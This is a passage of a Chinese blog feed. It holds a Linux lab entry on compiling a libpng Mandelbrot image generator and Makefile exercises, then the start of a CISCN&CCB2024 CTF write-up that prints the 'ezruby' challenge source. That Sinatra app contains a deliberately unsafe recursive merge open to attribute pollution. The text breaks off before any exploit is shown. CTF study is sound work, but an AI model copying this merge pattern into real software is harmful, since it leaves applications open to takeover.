punctuation">(</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>png_name<span class="token punctuation">,</span>    png_uint_32 width<span class="token punctuation">,</span>    png_uint_32 height<span class="token punctuation">,</span>    png_bytepp  data<span class="token punctuation">,</span>    <span class="token keyword">int</span>         color_type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    FILE       <span class="token operator">*</span>fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>png_name<span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    png_structp png <span class="token operator">=</span>        <span class="token function">png_create_write_struct</span><span class="token punctuation">(</span>PNG_LIBPNG_VER_STRING<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    png_infop info <span class="token operator">=</span> <span class="token function">png_create_info_struct</span><span class="token punctuation">(</span>png<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">png_init_io</span><span class="token punctuation">(</span>png<span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">png_set_IHDR</span><span class="token punctuation">(</span>        png<span class="token punctuation">,</span>        info<span class="token punctuation">,</span>        width<span class="token punctuation">,</span>        height<span class="token punctuation">,</span>        <span class="token number">8</span><span class="token punctuation">,</span>        color_type<span class="token punctuation">,</span>        PNG_INTERLACE_NONE<span class="token punctuation">,</span>        PNG_COMPRESSION_TYPE_DEFAULT<span class="token punctuation">,</span>        PNG_FILTER_TYPE_DEFAULT<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">png_write_info</span><span class="token punctuation">(</span>png<span class="token punctuation">,</span> info<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">png_write_image</span><span class="token punctuation">(</span>png<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">png_write_end</span><span class="token punctuation">(</span>png<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">png_destroy_write_struct</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>png<span class="token punctuation">,</span> <span class="token operator">&amp;</span>info<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//===Mandelbrot ����ͼ�� </span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token function">RD</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">float</span> x<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> k<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">float</span> a<span class="token operator">=</span>x<span class="token operator">*</span>x<span class="token operator">-</span>y<span class="token operator">*</span>y<span class="token operator">+</span><span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">768.0</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">512</span><span class="token punctuation">;</span>y<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>x<span class="token operator">*</span>y<span class="token operator">+</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">512.0</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">512</span><span class="token punctuation">;</span>x<span class="token operator">=</span>a<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">*</span>x<span class="token operator">+</span>y<span class="token operator">*</span>y<span class="token operator">></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">log</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">47</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token function">GR</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">float</span> x<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> k<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">float</span> a<span class="token operator">=</span>x<span class="token operator">*</span>x<span class="token operator">-</span>y<span class="token operator">*</span>y<span class="token operator">+</span><span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">768.0</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">512</span><span class="token punctuation">;</span>y<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>x<span class="token operator">*</span>y<span class="token operator">+</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">512.0</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">512</span><span class="token punctuation">;</span>x<span class="token operator">=</span>a<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">*</span>x<span class="token operator">+</span>y<span class="token operator">*</span>y<span class="token operator">></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">log</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">47</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token function">BL</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">float</span> x<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> k<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">float</span> a<span class="token operator">=</span>x<span class="token operator">*</span>x<span class="token operator">-</span>y<span class="token operator">*</span>y<span class="token operator">+</span><span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">768.0</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">512</span><span class="token punctuation">;</span>y<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>x<span class="token operator">*</span>y<span class="token operator">+</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">512.0</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">512</span><span class="token punctuation">;</span>x<span class="token operator">=</span>a<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">*</span>x<span class="token operator">+</span>y<span class="token operator">*</span>y<span class="token operator">></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">128</span><span class="token operator">-</span><span class="token function">log</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">23</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    png_uint_32 x<span class="token punctuation">,</span>y<span class="token punctuation">;</span>    png_uint_32 png_size <span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"using defalut 1024,you can input png_size,usage:  %s png_size\n"</span><span class="token punctuation">,</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                png_size <span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            png_size <span class="token operator">=</span> <span class="token function">strtoul</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>           <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>math_png_rgb  <span class="token operator">=</span> <span class="token string">"math_png_rgb.png"</span><span class="token punctuation">;</span>    pixel_RGB  <span class="token operator">*</span>image_data_rgb <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span>png_size <span class="token operator">*</span> png_size<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pixel_RGB<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pixel_RGB <span class="token operator">*</span><span class="token operator">*</span>row_ptrs_rgb   <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span>png_size<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pixel_RGB <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> y<span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> y <span class="token operator">&lt;</span> png_size<span class="token punctuation">;</span> y<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        row_ptrs_rgb<span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>image_data_rgb<span class="token punctuation">[</span>y <span class="token operator">*</span> png_size<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> x <span class="token operator">&lt;</span> png_size<span class="token punctuation">;</span> x<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            row_ptrs_rgb<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>red   <span class="token operator">=</span> <span class="token function">RD</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">255</span><span class="token punctuation">;</span>            row_ptrs_rgb<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>green <span class="token operator">=</span> <span class="token function">GR</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">255</span><span class="token punctuation">;</span>            row_ptrs_rgb<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>black <span class="token operator">=</span> <span class="token function">BL</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">255</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">write_data_to_png</span><span class="token punctuation">(</span>        math_png_rgb<span class="token punctuation">,</span>        png_size<span class="token punctuation">,</span>        png_size<span class="token punctuation">,</span>        <span class="token punctuation">(</span>png_bytepp<span class="token punctuation">)</span>row_ptrs_rgb<span class="token punctuation">,</span>        PNG_COLOR_TYPE_RGB<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>row_ptrs_rgb<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>image_data_rgb<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接编译会报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@rhel6 ex7<span class="token punctuation">]</span><span class="token comment"># gcc -o math_pix_png math_pix_png.c </span>math_pix_png.c: 在函数‘RD’中:math_pix_png.c:55: 警告：隐式声明与内建函数‘log’不兼容math_pix_png.c: 在函数‘GR’中:math_pix_png.c:60: 警告：隐式声明与内建函数‘log’不兼容math_pix_png.c: 在函数‘BL’中:math_pix_png.c:65: 警告：隐式声明与内建函数‘log’不兼容/tmp/ccPI6QFP.o: In <span class="token keyword">function</span> <span class="token variable"><span class="token variable">`</span>write_data_to_png':math_pix_png.c:<span class="token punctuation">(</span>.text+0x5b<span class="token punctuation">)</span>: undefined reference to <span class="token variable">`</span></span>png_create_write_struct<span class="token string">'math_pix_png.c:(.text+0x69): undefined reference to `png_create_info_struct'</span>math_pix_png.c:<span class="token punctuation">(</span>.text+0x7e<span class="token punctuation">)</span>: undefined reference to <span class="token variable"><span class="token variable">`</span>png_init_io'math_pix_png.c:<span class="token punctuation">(</span>.text+0xc5<span class="token punctuation">)</span>: undefined reference to <span class="token variable">`</span></span>png_set_IHDR<span class="token string">'math_pix_png.c:(.text+0xd7): undefined reference to `png_write_info'</span>math_pix_png.c:<span class="token punctuation">(</span>.text+0xe9<span class="token punctuation">)</span>: undefined reference to <span class="token variable"><span class="token variable">`</span>png_write_image'math_pix_png.c:<span class="token punctuation">(</span>.text+0xfc<span class="token punctuation">)</span>: undefined reference to <span class="token variable">`</span></span>png_write_end<span class="token string">'math_pix_png.c:(.text+0x10e): undefined reference to `png_destroy_write_struct'</span>/tmp/ccPI6QFP.o: In <span class="token keyword">function</span> <span class="token variable"><span class="token variable">`</span>RD':math_pix_png.c:<span class="token punctuation">(</span>.text+0x1c7<span class="token punctuation">)</span>: undefined reference to <span class="token variable">`</span></span>log<span class="token string">'/tmp/ccPI6QFP.o: In function `GR'</span><span class="token builtin class-name">:</span>math_pix_png.c:<span class="token punctuation">(</span>.text+0x297<span class="token punctuation">)</span>: undefined reference to <span class="token variable"><span class="token variable">`</span>log'/tmp/ccPI6QFP.o: In <span class="token keyword">function</span> <span class="token variable">`</span></span>BL<span class="token string">':math_pix_png.c:(.text+0x367): undefined reference to `log'</span>collect2: ld 返回 <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显缺头文件了，在 c 文件头部引入一个<code>&lt;math.h&gt;</code>，然后需要链接 libpng 库进行编译</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-o</span> math_pix_png math_pix_png.c <span class="token parameter variable">-lpng</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241203215652654.png" alt="image-20241203215652654"></p><hr><h2 id="实验2"><a href="#实验2" class="headerlink" title="实验2"></a>实验2</h2><ol><li><p>使用gcc命令把hello-c.tar.gz中的hello.c编译成可执行程序hello，运行查看效果，并使用ldd命令查看hello调用的相关外部函数库信息、使用file命令查看hello的信息。</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/141.jpg" alt="img"></p></li><li><p>把第一步编译生成的可执行程序hello删除，查看编译hello.c对应的Makefile，使用make工具编译该程序，检查编译结果。</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/151.jpg" alt="img"></p></li><li><p>解压并使用make命令编译math-c.tar.gz代码，阅读该压缩包中的Makefile，尝试直接使用gcc命令把mathtest.c编译成可执行程序mathsqrtdemo</p></li></ol><p>   <img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/161.jpg" alt="img"></p><ol start="4"><li><p>使用rpm -q查询sqlite函数库以及sqlite开发库是否已经安装，如果没有安装，请从光盘安装sqlite函数库及其开发包对应的rpm文件，并查询这2个rpm软件安装包向Linux系统安装了哪些文件。</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps17.jpg" alt="img"></p></li><li><p>编译调用了轻量级数据库sqlite3函数库的C程序代码。<br>sqlite-test-2目录中的源码文件sqlite-test.c为一个使用C语言结合sqlite api编写的sqlite3数据库访问程序</p><ul><li><p>使用make命令编译生成可执行程序<br>提示：编译成功后，按“sqlite-test  a.db”格式运行该程序，查看运行效果</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps18.jpg" alt="img"></p></li><li><p>阅读分析sqlite-test.c对应的Makefile文件，理解pkg-config命令的作用</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps19.jpg" alt="img"></p><p> pkg-config 的作用是帮助 gcc 命令获取关于 SQLite3 库的编译和链接信息，包括需要添加的头文件路径和库文件路径</p></li><li><p>使用make clean清除现有的编译成功的可执行程序sqlite-test</p></li></ul><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps20.jpg" alt="img"></p><ul><li><p>阅读sqlite-test-demo.tar.gz压缩包中的Makefile，对比两个版本的Makefile的写法差异。</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps21.jpg" alt="img"></p><p><code>-lsqlite3</code> 选项会直接链接 SQLite3 库</p><p>前者使用 <code>pkg-config --cflags --libs sqlite3</code> 来获取 SQLite3 库的编译和链接信息</p></li></ul></li><li><p>尝试编译 hello-gtk-2.0目录中的代码并运行，阅读并理解该代码及其Makefile文件</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps22.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps23.jpg" alt="img"></p><p>这个 Makefile 文件的作用是编译 hello-gtk2.c 文件，并链接 gtk+-2.0 库，以生成可执行文件 hello-gtk2。使用 pkg-config 可以方便地获取所需库的编译和链接信息</p></li><li><p>aes-demo.tar.gz是一个调用openssl库进行aes加密解密的C源代码，尝试编译运行该代码，并阅读Makefile文件，分析其编译gcc命令。</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps24.jpg" alt="img"></p><p>gcc命令中用 <code>-l</code> 链接 ssl 库和 crypto 库</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;期末自查用&lt;/p&gt;</summary>
    
    
    
    <category term="Basic" scheme="http://c1oudfl0w0.github.io/blog/categories/Basic/"/>
    
    
  </entry>
  
  <entry>
    <title>CISCN&amp;CCB2024</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/15/CISCN-CCB2024/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/15/CISCN-CCB2024/</id>
    <published>2024-12-15T01:15:16.000Z</published>
    <updated>2024-12-23T18:31:25.898Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一觉醒来NISA实力下降一万倍，哈哈两人退役之后我们完蛋了</p><p>这b web真是一天比一天难打了，梭哈半天拿不下少解题，其他题回头就被打烂</p><p>学web救不了NISA，唉我好菜啊😭</p><p>参考：</p><p><a href="https://xz.aliyun.com/t/16750">https://xz.aliyun.com/t/16750</a></p><p><a href="https://xz.aliyun.com/t/16792">https://xz.aliyun.com/t/16792</a></p><span id="more"></span><p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215231840744.png" alt="image-20241215231840744"></p><hr><h1 id="ezruby（Unsolved）"><a href="#ezruby（Unsolved）" class="headerlink" title="ezruby（Unsolved）"></a>ezruby（Unsolved）</h1><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># frozen_string_literal: true</span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'json'</span></span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'sinatra/base'</span></span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'net/http'</span></span><span class="token keyword">class</span> <span class="token class-name">Person</span>  <span class="token variable">@@url</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"http://default-url.com"</span></span>  attr_accessor <span class="token symbol">:name</span><span class="token punctuation">,</span> <span class="token symbol">:age</span><span class="token punctuation">,</span> <span class="token symbol">:details</span>  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span><span class="token symbol">name</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">age</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">details</span><span class="token operator">:</span><span class="token punctuation">)</span>    <span class="token variable">@name</span> <span class="token operator">=</span> name    <span class="token variable">@age</span> <span class="token operator">=</span> age    <span class="token variable">@details</span> <span class="token operator">=</span> details  <span class="token keyword">end</span>  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">url</span></span>    <span class="token variable">@@url</span>  <span class="token keyword">end</span>  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">merge_with</span></span><span class="token punctuation">(</span>additional<span class="token punctuation">)</span>    recursive_merge<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">,</span> additional<span class="token punctuation">)</span>  <span class="token keyword">end</span>  <span class="token keyword">private</span>  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">recursive_merge</span></span><span class="token punctuation">(</span>original<span class="token punctuation">,</span> additional<span class="token punctuation">,</span> current_obj <span class="token operator">=</span> original<span class="token punctuation">)</span>    additional<span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token keyword">do</span> <span class="token operator">|</span>key<span class="token punctuation">,</span> value<span class="token operator">|</span>      <span class="token keyword">if</span> value<span class="token punctuation">.</span>is_a<span class="token operator">?</span><span class="token punctuation">(</span><span class="token builtin">Hash</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> current_obj<span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>          next_obj <span class="token operator">=</span> current_obj<span class="token punctuation">.</span>public_send<span class="token punctuation">(</span>key<span class="token punctuation">)</span>          recursive_merge<span class="token punctuation">(</span>original<span class="token punctuation">,</span> value<span class="token punctuation">,</span> next_obj<span class="token punctuation">)</span>        <span class="token keyword">else</span>          new_object <span class="token operator">=</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">new</span>          current_obj<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">key</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> new_object<span class="token punctuation">)</span>          current_obj<span class="token punctuation">.</span>singleton_class<span class="token punctuation">.</span>attr_accessor key        <span class="token keyword">end</span>      <span class="token keyword">else</span>        <span class="token keyword">if</span> current_obj<span class="token punctuation">.</span>is_a<span class="token operator">?</span><span class="token punctuation">(</span><span class="token builtin">Hash</span><span class="token punctuation">)</span>          current_obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value        <span class="token keyword">else</span>          current_obj<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">key</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>          current_obj<span class="token punctuation">.</span>singleton_class<span class="token punctuation">.</span>attr_accessor key        <span class="token keyword">end</span>      <span class="token keyword">end</span>    <span class="token keyword">end</span>    original  <span class="token keyword">end</span><span class="token keyword">end</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token operator">&lt;</span> Person  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span><span class="token symbol">name</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">age</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">details</span><span class="token operator">:</span><span class="token punctuation">)</span>    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token symbol">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span> <span class="token symbol">age</span><span class="token operator">:</span> age<span class="token punctuation">,</span> <span class="token symbol">details</span><span class="token operator">:</span> details<span class="token punctuation">)</span>  <span class="token keyword">end</span><span class="token keyword">end</span><span class="token keyword">class</span> <span class="token class-name">KeySigner</span>  <span class="token variable">@@signing_key</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"default-signing-key"</span></span>  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">signing_key</span></span>    <span class="token variable">@@signing_key</span>  <span class="token keyword">end</span>  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">sign</span></span><span class="token punctuation">(</span>signing_key<span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">data</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">-signed-with-</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">signing_key</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>  <span class="token keyword">end</span><span class="token keyword">end</span><span class="token keyword">class</span> <span class="token class-name">JSONMergerApp</span> <span class="token operator">&lt;</span> Sinatra<span class="token double-colon punctuation">::</span>Base  set  <span class="token symbol">:bind</span> <span class="token punctuation">,</span>  <span class="token string-literal"><span class="token string">'0.0.0.0'</span></span>  set  <span class="token symbol">:port</span> <span class="token punctuation">,</span>  <span class="token string-literal"><span class="token string">'8888'</span></span>  post <span class="token string-literal"><span class="token string">'/merge'</span></span> <span class="token keyword">do</span>    content_type <span class="token symbol">:json</span>    j_str <span class="token operator">=</span> request<span class="token punctuation">.</span>body<span class="token punctuation">.</span>read    <span class="token keyword">return</span> <span class="token string-literal"><span class="token string">"try try try"</span></span>  <span class="token keyword">if</span> j_str<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"\\"</span></span><span class="token punctuation">)</span> <span class="token operator">||</span> j_str<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"h"</span></span><span class="token punctuation">)</span>    json_input <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span>parse<span class="token punctuation">(</span>j_str<span class="token punctuation">,</span> <span class="token symbol">symbolize_names</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">)</span>    user <span class="token operator">=</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>      <span class="token symbol">name</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"John Doe"</span></span><span class="token 